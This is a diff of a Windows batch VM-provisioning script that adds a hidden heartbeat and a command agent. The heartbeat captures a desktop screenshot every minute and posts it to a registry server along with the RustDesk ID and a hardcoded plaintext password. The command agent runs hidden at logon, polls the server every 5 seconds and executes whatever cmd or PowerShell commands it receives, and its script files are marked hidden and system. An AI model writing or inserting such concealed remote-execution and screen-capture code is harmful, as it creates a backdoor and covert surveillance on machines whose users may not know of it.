-    echo   [WARN] RDP port !RDP_PORT! not detected >> "%LOG%"
-)
-
-:: Save port to hidden/system PCL directory for QuickInstall / VM registry
-if not exist "%PCL_DIR%" mkdir "%PCL_DIR%" >nul 2>&1
-echo !RDP_PORT! > "%PCL_DIR%\rdp_port.txt"
-attrib +h +s "%PCL_DIR%" "%PCL_DIR%\rdp_port.txt" >nul 2>&1
-
-echo   Remote Desktop enabled + optimized for mRemoteNG.
-echo   Remote Desktop enabled + optimized (port !RDP_PORT!) >> "%LOG%"
-
-:: ---- HEARTBEAT: Keep VM "Online" in dashboard ----
-:: Create heartbeat script that sends POST /heartbeat every 2 minutes
+:: ---- HEARTBEAT & MONITORING: Keep VM "Online" and send Thumbnail ----
 set "HB_SCRIPT=%PCL_DIR%\vm_heartbeat.ps1"
 (
 echo $ProgressPreference = 'SilentlyContinue'
 echo [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
 echo $url = '%VM_REGISTRY_URL%/heartbeat'
+echo $registerUrl = '%VM_REGISTRY_URL%/register'
 echo $hostname = $env:COMPUTERNAME
+echo if ^($hostname -match '^(?i:PCLPCL)'^) { $hostname = 'PCL' + $hostname.Substring^(6^) }
 echo $ip = ^(Get-NetIPAddress -AddressFamily IPv4 -ErrorAction SilentlyContinue ^| Where-Object {$_.IPAddress -notlike '127.*' -and $_.IPAddress -notlike '169.*'} ^| Select-Object -First 1^).IPAddress
-echo $body = @{ hostname = $hostname; ip = $ip } ^| ConvertTo-Json
-echo try { Invoke-RestMethod -Uri $url -Method POST -Body $body -ContentType 'application/json' -TimeoutSec 10 ^| Out-Null } catch {}
+echo 
+echo $rd_id = ''
+echo $paths = @("$env:ProgramFiles\RustDesk\config\RustDesk.toml", "$env:ProgramData\RustDesk\config\RustDesk.toml", "$env:LOCALAPPDATA\RustDesk\config\RustDesk.toml", "C:\Windows\System32\config\systemprofile\AppData\Roaming\RustDesk\config\RustDesk.toml", "C:\Users\PCL\AppData\Roaming\RustDesk\config\RustDesk.toml", "C:\Users\Public\RustDesk\config\RustDesk.toml")
+echo foreach^($p in $paths^) {
+echo     if^(Test-Path $p^) {
+echo         $raw = Get-Content $p -Raw
+echo         $m = $raw -match "id\s*=\s*['""]?([^'""\r\n]+)"
+echo         if^($m^) { $rd_id = $Matches[1].Trim^(^); break }
+echo     }
+echo }
+echo 
+echo $screenshot = ''
+echo try {
+echo     Add-Type -AssemblyName System.Windows.Forms
+echo     Add-Type -AssemblyName System.Drawing
+echo     $bounds = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
+echo     $bmp = New-Object System.Drawing.Bitmap^($bounds.Width, $bounds.Height^)
+echo     $gfx = [System.Drawing.Graphics]::FromImage^($bmp^)
+echo     $gfx.CopyFromScreen^(0, 0, 0, 0, $bmp.Size^)
+echo     $thumb = New-Object System.Drawing.Bitmap^(320, 180^)
+echo     $g2 = [System.Drawing.Graphics]::FromImage^($thumb^)
+echo     $g2.DrawImage^($bmp, 0, 0, 320, 180^)
+echo     $stream = New-Object System.IO.MemoryStream
+echo     $codec = [System.Drawing.Imaging.ImageCodecInfo]::GetImageEncoders^(^) ^| Where-Object {$_.MimeType -eq 'image/jpeg'} ^| Select-Object -First 1
+echo     $jpegParams = New-Object System.Drawing.Imaging.EncoderParameters^(1^)
+echo     $jpegParams.Param[0] = New-Object System.Drawing.Imaging.EncoderParameter^([System.Drawing.Imaging.Encoder]::Quality, 55L^)
+echo     $thumb.Save^($stream, $codec, $jpegParams^)
+echo     $screenshot = [Convert]::ToBase64String^($stream.ToArray^(^)^)
+echo     $jpegParams.Dispose^(^); $g2.Dispose^(^); $thumb.Dispose^(^); $gfx.Dispose^(^); $bmp.Dispose^(^); $stream.Dispose^(^)
+echo } catch {}
+echo 
+echo $os = ^(Get-CimInstance Win32_OperatingSystem^).Caption
+echo $body = @{ hostname = $hostname; ip = $ip; rustdesk = $rd_id; screenshot = $screenshot; os = $os; user = 'PCL'; password = 'PCL@1231233' } ^| ConvertTo-Json -Depth 3
+echo try {
+echo     Invoke-RestMethod -Uri $url -Method POST -Body $body -ContentType 'application/json' -TimeoutSec 10 ^| Out-Null
+echo } catch {
+echo     try { Invoke-RestMethod -Uri $registerUrl -Method POST -Body $body -ContentType 'application/json' -TimeoutSec 10 ^| Out-Null } catch {}
+echo }
 ) > "%HB_SCRIPT%"
 attrib +h +s "%PCL_DIR%" "%HB_SCRIPT%" >nul 2>&1
 
-:: Register Scheduled Task to run heartbeat every 2 minutes (survives reboot)
+:: Register Scheduled Task to run heartbeat every 1 minute (Interactive to capture screen)
 schtasks /Delete /TN "VM_Heartbeat" /F >nul 2>&1
-schtasks /Create /TN "VM_Heartbeat" /SC MINUTE /MO 2 /TR "powershell -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File %HB_SCRIPT%" /RU SYSTEM /RL HIGHEST /F >nul 2>&1
+schtasks /Create /TN "VM_Heartbeat" /SC MINUTE /MO 1 /TR "powershell -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File %HB_SCRIPT%" /RU "PCL" /IT /RL HIGHEST /F >nul 2>&1
 :: Run it once immediately
 schtasks /Run /TN "VM_Heartbeat" >nul 2>&1
-echo   - Heartbeat scheduled (every 2 min)
+echo   - Heartbeat + Monitoring scheduled (every 1 min)
+
+:: ---- COMMAND AGENT: Poll dashboard commands and execute them locally ----
+set "CMD_AGENT=%PCL_DIR%\vm_command_agent.ps1"
+> "%CMD_AGENT%" echo $ProgressPreference = 'SilentlyContinue'
+>> "%CMD_AGENT%" echo [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+>> "%CMD_AGENT%" echo $base = '%VM_REGISTRY_URL%'
+>> "%CMD_AGENT%" echo $hostname = $env:COMPUTERNAME
+>> "%CMD_AGENT%" echo if ($hostname -match '^(?i:PCLPCL)') { $hostname = 'PCL' + $hostname.Substring(6) }
+>> "%CMD_AGENT%" echo $seen = @{}
+>> "%CMD_AGENT%" echo while ($true) {
+>> "%CMD_AGENT%" echo     try {
+>> "%CMD_AGENT%" echo         $encodedHost = [uri]::EscapeDataString($hostname)
+>> "%CMD_AGENT%" echo         $taskUrl = $base + '/agent/tasks?hostname=' + $encodedHost
+>> "%CMD_AGENT%" echo         $resultUrl = $base + '/agent/task-result'
+>> "%CMD_AGENT%" echo         $tasks = Invoke-RestMethod -Uri $taskUrl -Method GET -TimeoutSec 10
+>> "%CMD_AGENT%" echo         foreach ($task in @($tasks)) {
+>> "%CMD_AGENT%" echo             if ($seen.ContainsKey($task.id)) { continue }
+>> "%CMD_AGENT%" echo             $seen[$task.id] = (Get-Date)
+>> "%CMD_AGENT%" echo             $output = ''
+>> "%CMD_AGENT%" echo             $exitCode = 0
+>> "%CMD_AGENT%" echo             try {
+>> "%CMD_AGENT%" echo                 if ($task.shell -eq 'cmd') {
+>> "%CMD_AGENT%" echo                     $output = cmd.exe /d /s /c $task.command 2^>^&1 ^| Out-String
+>> "%CMD_AGENT%" echo                     $exitCode = $LASTEXITCODE
+>> "%CMD_AGENT%" echo                 } else {
+>> "%CMD_AGENT%" echo                     $output = powershell.exe -NoProfile -ExecutionPolicy Bypass -Command $task.command 2^>^&1 ^| Out-String
+>> "%CMD_AGENT%" echo                     $exitCode = $LASTEXITCODE
+>> "%CMD_AGENT%" echo                 }
+>> "%CMD_AGENT%" echo                 $status = if ($exitCode -eq 0) { 'ok' } else { 'error' }
+>> "%CMD_AGENT%" echo             } catch {
+>> "%CMD_AGENT%" echo                 $status = 'error'
+>> "%CMD_AGENT%" echo                 $exitCode = -1
+>> "%CMD_AGENT%" echo                 $output = $_.Exception.Message
+>> "%CMD_AGENT%" echo             }
+>> "%CMD_AGENT%" echo             if ($null -eq $output) { $output = '' }
+>> "%CMD_AGENT%" echo             if ($output.Length -gt 3900) { $output = $output.Substring(0, 3900) }
+>> "%CMD_AGENT%" echo             $body = @{ hostname = $hostname; id = $task.id; status = $status; exitCode = $exitCode; output = $output } ^| ConvertTo-Json -Depth 3
+>> "%CMD_AGENT%" echo             try { Invoke-RestMethod -Uri $resultUrl -Method POST -Body $body -ContentType 'application/json' -TimeoutSec 10 ^| Out-Null } catch {}
+>> "%CMD_AGENT%" echo         }
+>> "%CMD_AGENT%" echo         $now = Get-Date
+>> "%CMD_AGENT%" echo         foreach ($k in @($seen.Keys)) {
+>> "%CMD_AGENT%" echo             $age = $now - $seen[$k]
+>> "%CMD_AGENT%" echo             if ($age.TotalHours -gt 24) { $seen.Remove($k) }
+>> "%CMD_AGENT%" echo         }
+>> "%CMD_AGENT%" echo     } catch {}
+>> "%CMD_AGENT%" echo     Start-Sleep -Seconds 5
+>> "%CMD_AGENT%" echo }
+attrib +h +s "%PCL_DIR%" "%CMD_AGENT%" >nul 2>&1
+schtasks /Delete /TN "VM_CommandAgent" /F >nul 2>&1
+schtasks /Create /TN "VM_CommandAgent" /SC ONLOGON /TR "powershell -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File %CMD_AGENT%" /RU "PCL" /IT /RL HIGHEST /F >nul 2>&1
+schtasks /Run /TN "VM_CommandAgent" >nul 2>&1
+echo   - Command agent scheduled (polls every 5 sec)
 
 :: ============================================================
 :: PHASE 9: FINAL CLEANUP
@@ -1168,7 +1174,7 @@ echo [11/11] Final Cleanup... >> "%LOG%"
 del /f /q "%SystemRoot%\Temp\*" >nul 2>&1
 del /f /q "%TEMP%\*" >nul 2>&1
 
-:: NOTE: VM already registered with worker during RDP phase (see PHASE 8).
+:: NOTE: VM already registered with worker during RustDesk monitoring phase (see PHASE 8).
 :: No need to re-register here.
 
 :: Force process all idle/pending tasks NOW (flush deferred cleanup, .NET NGEN, font cache rebuild)
